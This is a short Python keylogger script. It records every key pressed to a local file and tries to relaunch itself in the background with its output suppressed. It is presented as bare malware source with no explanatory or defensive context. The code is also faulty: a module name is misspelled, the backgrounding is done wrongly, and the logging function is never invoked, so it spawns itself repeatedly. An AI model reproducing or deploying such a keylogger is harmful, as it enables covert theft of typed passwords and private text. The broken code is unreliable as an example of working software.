import keyboard,threading,subprocess,sys


def keylogger(file_name="key_log.txt"):

    try:
        while True:
            with open(file_name,"a+",encoding="utf-8")as file_log:
                file_log.write(f"{keyboard.read_key()}\n")
    except:
        pass

def main():
    threading.Thread(target=keylogger).start()

if __name__ == "__main__":

    subprocess.call(["nohup","python3",f"{sys.argv[0]}","&"],stdout=subproces.DEVNULL,stderr=subprocess.DEVNULL)


